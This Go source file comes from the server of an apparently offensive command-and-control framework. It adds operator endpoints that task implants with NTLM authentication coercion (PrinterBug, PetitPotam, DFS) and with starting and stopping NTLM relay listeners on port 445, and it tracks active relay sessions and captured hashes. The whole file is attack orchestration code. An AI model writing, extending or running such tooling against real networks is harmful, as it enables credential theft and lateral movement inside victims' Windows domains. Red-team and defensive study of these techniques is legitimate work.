package server

import (
	"fmt"
	"log/slog"
	"net/http"
	"sync"
	"time"

	"github.com/forgec2/forgec2/pkg/protocol"
	"github.com/gin-gonic/gin"
)

// ntlmRelaySession tracks a single active NTLM relay session.
type ntlmRelaySession struct {
	ID             string    `json:"id"`
	AgentID        string    `json:"agent_id"`
	Target         string    `json:"target"`
	Listener       string    `json:"listener"`
	Flags          string    `json:"flags,omitempty"`
	StartedAt      time.Time `json:"started_at"`
	HashesCaptured int       `json:"hashes_captured"`
}

// ntlmRelayStore manages active NTLM relay sessions in memory.
type ntlmRelayStore struct {
	mu       sync.RWMutex
	sessions map[string]*ntlmRelaySession
	seq      uint64
}

func newNTLMRelayStore() *ntlmRelayStore {
	return &ntlmRelayStore{sessions: make(map[string]*ntlmRelaySession)}
}

func (st *ntlmRelayStore) add(session *ntlmRelaySession) {
	st.mu.Lock()
	defer st.mu.Unlock()
	st.seq++
	session.ID = fmt.Sprintf("ntlm-%d", st.seq)
	st.sessions[session.ID] = session
}

func (st *ntlmRelayStore) remove(id string) bool {
	st.mu.Lock()
	defer st.mu.Unlock()
	if _, ok := st.sessions[id]; ok {
		delete(st.sessions, id)
		return true
	}
	return false
}

func (st *ntlmRelayStore) list() []*ntlmRelaySession {
	st.mu.RLock()
	defer st.mu.RUnlock()
	out := make([]*ntlmRelaySession, 0, len(st.sessions))
	for _, s := range st.sessions {
		out = append(out, s)
	}
	return out
}

func (st *ntlmRelayStore) findByAgent(agentID string) *ntlmRelaySession {
	st.mu.RLock()
	defer st.mu.RUnlock()
	for _, s := range st.sessions {
		if s.AgentID == agentID {
			return s
		}
	}
	return nil
}

// handleNTLMRelayStatus returns active NTLM relay sessions.
// GET /ntlm/relay_status
func (s *Server) handleNTLMRelayStatus(c *gin.Context) {
	// The store is built in NewServer, but a report endpoint that 500s on a
	// nil store would be a worse failure than one that reports nothing.
	if s.ntlmRelays == nil {
		respond(c, gin.H{"active": []interface{}{}, "count": 0, "running": false})
		return
	}
	// A relay session is filed against an agent, so hide sessions the caller
	// has no visibility of rather than dumping the whole fleet's relays.
	visible := make([]*ntlmRelaySession, 0, 1)
	for _, session := range s.ntlmRelays.list() {
		if s.resolveVisibleAgentID(c, session.AgentID) != "" {
			visible = append(visible, session)
		}
	}
	respond(c, gin.H{

		"active":  visible,
		"count":   len(visible),
		"running": len(visible) > 0,
	})
}

// handleCoerce dispatches an NTLM coercion task (PrinterBug, PetitPotam, DFS) to an agent.
// POST /agents/:id/coerce/:type
func (s *Server) handleCoerce(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	coerceType := c.Param("type")
	target := c.PostForm("target")
	listenAddr := c.PostForm("listen_addr")
	if target == "" {
		respondError(c, http.StatusBadRequest, "target is required")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	var taskType string
	switch coerceType {
	case "printerbug":
		taskType = protocol.TaskTypeCoercePrinterBug
	case "petitpotam":
		taskType = protocol.TaskTypeCoercePetitPotam
	case "dfs":
		taskType = protocol.TaskTypeCoerceDFS
	default:
		respondError(c, http.StatusBadRequest, "unknown coercion type: "+coerceType)
		return
	}

	cmd := target
	if listenAddr != "" {
		cmd = target + " " + listenAddr
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: taskType, Command: cmd})
	if task == nil {
		return
	}
	slog.Info("Coerce requested", "agent_id", id, "type", coerceType, "target", target)
	s.dispatchTask(c, task, "coerce_"+coerceType, fmt.Sprintf("target=%s listener=%s", target, listenAddr))
}

// handleNTLMRelayStart dispatches a relay start task and registers the session.
// POST /agents/:id/relay/start
func (s *Server) handleNTLMRelayStart(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	target := c.PostForm("target")
	listener := c.PostForm("listener")
	flags := c.PostForm("flags")
	if target == "" {
		respondError(c, http.StatusBadRequest, "target is required")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	// Implant: relay_ntlm_start <listenAddr> [forwardTarget]
	listenAddr := listener
	if listenAddr == "" {
		listenAddr = "0.0.0.0:445"
	}
	cmd := listenAddr
	if target != "" {
		cmd += " " + target
	}
	if flags != "" {
		cmd += " " + flags
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: protocol.TaskTypeRelayNTLMStart, Command: cmd})
	if task == nil {
		return
	}

	s.ntlmRelays.add(&ntlmRelaySession{
		AgentID:   id,
		Target:    target,
		Listener:  listener,
		Flags:     flags,
		StartedAt: time.Now(),
	})

	slog.Info("NTLM relay start requested", "agent_id", id, "target", target, "listener", listener)
	s.dispatchTask(c, task, "relay_ntlm_start", fmt.Sprintf("target=%s listener=%s", target, listener))
}

// handleNTLMRelayStop dispatches a relay stop task and removes the session.
// POST /agents/:id/relay/stop
func (s *Server) handleNTLMRelayStop(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: protocol.TaskTypeRelayNTLMStop})
	if task == nil {
		return
	}

	sess := s.ntlmRelays.findByAgent(id)
	if sess != nil {
		s.ntlmRelays.remove(sess.ID)
	}

	slog.Info("NTLM relay stop requested", "agent_id", id)
	s.dispatchTask(c, task, "relay_ntlm_stop", "stop relay")
}
